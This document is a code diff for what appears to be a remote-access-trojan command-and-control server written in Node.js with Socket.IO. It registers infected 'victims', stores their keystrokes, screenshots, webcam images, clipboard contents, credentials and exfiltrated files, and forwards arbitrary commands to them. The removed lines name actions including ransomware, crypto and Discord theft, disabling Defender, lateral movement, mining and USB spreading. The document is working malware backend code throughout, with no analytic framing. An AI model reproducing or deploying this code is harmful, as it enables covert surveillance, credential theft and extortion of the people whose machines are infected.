@@ -6,15 +6,18 @@ const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { maxHttpBufferSize: 10 * 1024 * 1024, cors: { origin: '*' } });
+const io = new Server(server, {
+    maxHttpBufferSize: 50 * 1024 * 1024,
+    cors: { origin: '*' }
+});
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 
-const LOOT = './loot';
-if (!fs.existsSync(LOOT)) fs.mkdirSync(LOOT);
+const DATA_DIR = './data';
+if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 
-let clients = {};
+let victims = {};
 let responses = {};
 let keylogs = {};
 let screenshots = {};
@@ -22,174 +25,185 @@ let credentials = {};
 let processes = {};
 let clipboardLog = {};
 
-app.get('/api/clients', (req, res) => {
-    const list = Object.values(clients).filter(c => c.type === 'victim').map(c => ({
-        id: c.id, ip: c.ip, hostname: c.hostname, user: c.user, os: c.os,
-        online: c.online, cpu: c.cpu, gpu: c.gpu, ram: c.ram, resolution: c.resolution,
-        country: c.country, lat: c.lat, lon: c.lon, uptime: c.uptime, lastSeen: c.lastSeen
+// ============ REST API ============
+
+app.get('/api/victims', (req, res) => {
+    const list = Object.values(victims).map(v => ({
+        id: v.id,
+        ip: v.ip,
+        hostname: v.hostname,
+        user: v.user,
+        os: v.os,
+        cpu: v.cpu,
+        gpu: v.gpu,
+        ram: v.ram,
+        resolution: v.resolution,
+        country: v.country,
+        lat: v.lat,
+        lon: v.lon,
+        uptime: v.uptime,
+        online: v.online,
+        lastSeen: v.lastSeen,
+        firstSeen: v.firstSeen
     }));
     res.json(list);
 });
 
-app.get('/api/stats', (req, res) => {
-    const all = Object.values(clients).filter(c => c.type === 'victim');
-    const online = all.filter(c => c.online).length;
-    const total = all.length;
-    const today = all.filter(c => c.lastSeen && new Date(c.lastSeen).toDateString() === new Date().toDateString()).length;
-    res.json({ total, online, today });
+app.get('/api/victim/:id', (req, res) => {
+    const v = victims[req.params.id];
+    if (!v) return res.status(404).json({ error: 'Not found' });
+    res.json({
+        ...v,
+        responses: responses[req.params.id] || [],
+        keylogs: keylogs[req.params.id] || [],
+        screenshots: screenshots[req.params.id] || [],
+        credentials: credentials[req.params.id] || {},
+        processes: processes[req.params.id] || [],
+        clipboard: clipboardLog[req.params.id] || []
+    });
 });
 
-app.get('/api/send_cmd', (req, res) => {
-    const { clientId, cmd } = req.query;
-    if (!clientId || !cmd) return res.status(400).send('Brak');
-    io.to(clientId).emit('cmd', cmd);
+app.get('/api/stats', (req, res) => {
+    const all = Object.values(victims);
+    const online = all.filter(v => v.online).length;
+    const total = all.length;
+    const today = all.filter(v => v.firstSeen && new Date(v.firstSeen).toDateString() === new Date().toDateString()).length;
+    const countries = {};
+    all.forEach(v => { if (v.country) countries[v.country] = (countries[v.country] || 0) + 1; });
+    res.json({ total, online, offline: total - online, today, countries });
+});
+
+app.get('/api/cmd', (req, res) => {
+    const { id, cmd } = req.query;
+    if (!id || !cmd) return res.status(400).send('Missing params');
+    io.to(id).emit('cmd', cmd);
     res.send('OK');
 });
 
-app.get('/api/responses/:clientId', (req, res) => {
-    res.send((responses[req.params.clientId] || []).join('\n---\n') || 'Brak');
+app.get('/api/responses/:id', (req, res) => {
+    res.send((responses[req.params.id] || []).join('\n---\n') || 'No responses');
 });
 
-app.get('/api/keylogs/:clientId', (req, res) => {
-    res.send((keylogs[req.params.clientId] || []).join('\n') || 'Brak');
+app.get('/api/keylogs/:id', (req, res) => {
+    res.send((keylogs[req.params.id] || []).join('\n') || 'No keylogs');
 });
 
-app.get('/api/screenshots/:clientId', (req, res) => {
-    res.json(screenshots[req.params.clientId] || []);
+app.get('/api/clipboard/:id', (req, res) => {
+    res.send((clipboardLog[req.params.id] || []).join('\n---\n') || 'No clipboard');
 });
 
-app.get('/api/screenshot/:clientId/:filename', (req, res) => {
-    const p = `${LOOT}/${req.params.clientId}/${req.params.filename}`;
+app.get('/api/screenshot/:id/:file', (req, res) => {
+    const p = `${DATA_DIR}/${req.params.id}/${req.params.file}`;
     if (fs.existsSync(p)) res.sendFile(require('path').resolve(p));
-    else res.status(404).send('Brak');
+    else res.status(404).send('Not found');
 });
 
-app.get('/api/credentials/:clientId', (req, res) => {
-    res.json(credentials[req.params.clientId] || {});
+// Generic action endpoint
+app.get('/api/action/:action', (req, res) => {
+    io.to(req.query.id).emit(req.params.action, req.query);
+    res.send('OK');
 });
 
-app.get('/api/clipboard/:clientId', (req, res) => {
-    res.send((clipboardLog[req.params.clientId] || []).join('\n---\n') || 'Brak');
-});
-
-app.get('/api/processes/:clientId', (req, res) => {
-    res.json(processes[req.params.clientId] || []);
-});
-
-const actions = ['files','download_file','upload_file','process_kill','process_start','power','bsod',
-    'ransomware','steal_crypto','steal_discord','steal_steam','steal_telegram','steal_outlook',
-    'proxy_start','proxy_stop','scan_network','lateral_move','cleanse','update','selfdestruct',
-    'webcam_snap','mic_record','hvnc_start','hvnc_stop','hidden_browser','auto_fill','clipboard_grab',
-    'fake_login','web_inject','wifi_steal','geolocate','wallpaper','play_sound','chat_msg',
-    'disable_defender','cookie_steal','record_screen','kill_input','hide_cursor','cd_tray',
-    'simulate_click','miner_start','miner_stop','serial_keys','check_av','disable_updates',
-    'add_firewall','uac_off','system_report','inject_process','usb_spread'];
-
-actions.forEach(a => {
-    app.get(`/api/${a}`, (req, res) => {
-        io.to(req.query.clientId).emit(a, req.query);
-        res.send('OK');
-    });
-});
+// ============ SOCKET.IO ============
 
 io.on('connection', (socket) => {
-    const clientType = socket.handshake.query.type || 'victim';
-    const clientId = socket.handshake.query.id || socket.id;
+    const query = socket.handshake.query;
+    
+    if (query.role !== 'victim') return;
+    
+    const id = socket.id;
     const ip = socket.handshake.address;
     
-    // TYLKO jeśli to victim, dodaj do listy
-    if (clientType === 'victim') {
-        clients[clientId] = {
-            id: clientId, ip: ip, socketId: socket.id, online: true, type: 'victim',
-            hostname: '', user: '', os: '', cpu: '', gpu: '', ram: '',
-            resolution: '', country: '', lat: 0, lon: 0, uptime: '', lastSeen: new Date().toISOString()
-        };
-        responses[clientId] = responses[clientId] || [];
-        keylogs[clientId] = keylogs[clientId] || [];
-        screenshots[clientId] = screenshots[clientId] || [];
-        clipboardLog[clientId] = clipboardLog[clientId] || [];
-    }
+    victims[id] = {
+        id, ip, socketId: socket.id, online: true,
+        hostname: '', user: '', os: '', cpu: '', gpu: '', ram: '',
+        resolution: '', country: '', lat: 0, lon: 0, uptime: '',
+        lastSeen: new Date().toISOString(), firstSeen: new Date().toISOString()
+    };
+    responses[id] = [];
+    keylogs[id] = [];
+    screenshots[id] = [];
+    clipboardLog[id] = [];
     
     socket.on('register', (data) => {
-        if (clientType === 'victim' && clients[clientId]) {
-            Object.assign(clients[clientId], data, { online: true, lastSeen: new Date().toISOString() });
-        }
+        Object.assign(victims[id], data, { online: true, lastSeen: new Date().toISOString() });
     });
-
+    
     socket.on('response', (data) => {
-        if (responses[clientId]) {
-            responses[clientId].push(`[${new Date().toLocaleTimeString()}] ${data}`);
-            if (responses[clientId].length > 200) responses[clientId].shift();
-        }
+        responses[id].push(`[${new Date().toLocaleTimeString()}] ${data}`);
+        if (responses[id].length > 500) responses[id].shift();
     });
-
+    
     socket.on('keylog', (data) => {
-        if (keylogs[clientId]) {
-            keylogs[clientId].push(data);
-            if (keylogs[clientId].length > 500) keylogs[clientId].shift();
-        }
+        keylogs[id].push(data);
+        if (keylogs[id].length > 1000) keylogs[id].shift();
     });
-
+    
+    socket.on('clipboard_data', (data) => {
+        clipboardLog[id].push(`[${new Date().toLocaleTimeString()}] ${data}`);
+        if (clipboardLog[id].length > 200) clipboardLog[id].shift();
+    });
+    
     socket.on('screenshot', (data) => {
-        const dir = `${LOOT}/${clientId}`;
+        const dir = `${DATA_DIR}/${id}`;
         if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
         const fn = `screen_${Date.now()}.jpg`;
         fs.writeFileSync(`${dir}/${fn}`, Buffer.from(data, 'base64'));
-        if (!screenshots[clientId]) screenshots[clientId] = [];
-        screenshots[clientId].push({ filename: fn, time: new Date().toISOString() });
-        if (screenshots[clientId].length > 100) screenshots[clientId].shift();
+        screenshots[id] = screenshots[id] || [];
+        screenshots[id].push({ filename: fn, time: new Date().toISOString() });
     });
-
-    socket.on('screen_frame', (data) => io.emit(`screen_frame_${clientId}`, data));
-    socket.on('webcam_frame', (data) => io.emit(`webcam_frame_${clientId}`, data));
-    socket.on('hvnc_frame', (data) => io.emit(`hvnc_frame_${clientId}`, data));
+    
+    socket.on('screen_frame', (data) => io.emit(`stream:screen:${id}`, data));
+    socket.on('webcam_frame', (data) => io.emit(`stream:webcam:${id}`, data));
+    socket.on('hvnc_frame', (data) => io.emit(`stream:hvnc:${id}`, data));
     
     socket.on('webcam_snap', (data) => {
-        const dir = `${LOOT}/${clientId}`;
+        const dir = `${DATA_DIR}/${id}`;
         if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
         fs.writeFileSync(`${dir}/webcam_${Date.now()}.jpg`, Buffer.from(data, 'base64'));
     });
-
-    socket.on('credentials', (data) => { credentials[clientId] = data; });
-    socket.on('processes', (data) => { processes[clientId] = data; });
-    socket.on('clipboard_data', (data) => {
-        if (clipboardLog[clientId]) {
-            clipboardLog[clientId].push(data);
-            if (clipboardLog[clientId].length > 200) clipboardLog[clientId].shift();
+    
+    socket.on('credentials', (data) => { credentials[id] = data; });
+    socket.on('processes', (data) => { processes[id] = data; });
+    
+    socket.on('file_data', (data) => {
+        const dir = `${DATA_DIR}/${id}/downloads`;
+        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+        fs.writeFileSync(`${dir}/${data.name}`, Buffer.from(data.data, 'base64'));
+        responses[id].push(`[FILE] Downloaded: ${data.name}`);
+    });
+    
+    socket.on('video_data', (data) => {
+        const dir = `${DATA_DIR}/${id}`;
+        fs.writeFileSync(`${dir}/screen_rec_${Date.now()}.mp4`, Buffer.from(data, 'base64'));
+        responses[id].push('[VIDEO] Screen recording saved');
+    });
+    
+    socket.on('geolocate', (data) => {
+        if (victims[id]) {
+            victims[id].country = data.country;
+            victims[id].lat = data.lat;
+            victims[id].lon = data.lon;
         }
     });
     
-    socket.on('file_data', (data) => {
-        const dir = `${LOOT}/${clientId}/downloads`;
-        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-        fs.writeFileSync(`${dir}/${data.name}`, Buffer.from(data.data, 'base64'));
-    });
-
-    socket.on('mic_data', (data) => {
-        const dir = `${LOOT}/${clientId}`;
-        fs.writeFileSync(`${dir}/mic_${Date.now()}.wav`, Buffer.from(data, 'base64'));
-    });
-
-    socket.on('video_data', (data) => {
-        const dir = `${LOOT}/${clientId}`;
-        fs.writeFileSync(`${dir}/screen_rec_${Date.now()}.mp4`, Buffer.from(data, 'base64'));
-    });
-
-    socket.on('geolocate', (data) => {
-        if (clients[clientId]) {
-            clients[clientId].country = data.country;
-            clients[clientId].lat = data.lat;
-            clients[clientId].lon = data.lon;
+    socket.on('system_info', (data) => {
+        if (victims[id]) {
+            victims[id].cpu = data.cpu || '';
+            victims[id].gpu = data.gpu || '';
+            victims[id].ram = data.ram || '';
+            victims[id].resolution = data.resolution || '';
+            victims[id].uptime = data.uptime || '';
         }
     });
-
+    
     socket.on('disconnect', () => {
-        if (clients[clientId]) {
-            clients[clientId].online = false;
-            clients[clientId].lastSeen = new Date().toISOString();
+        if (victims[id]) {
+            victims[id].online = false;
+            victims[id].lastSeen = new Date().toISOString();
         }
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log('Serwer na porcie ' + PORT));
+server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
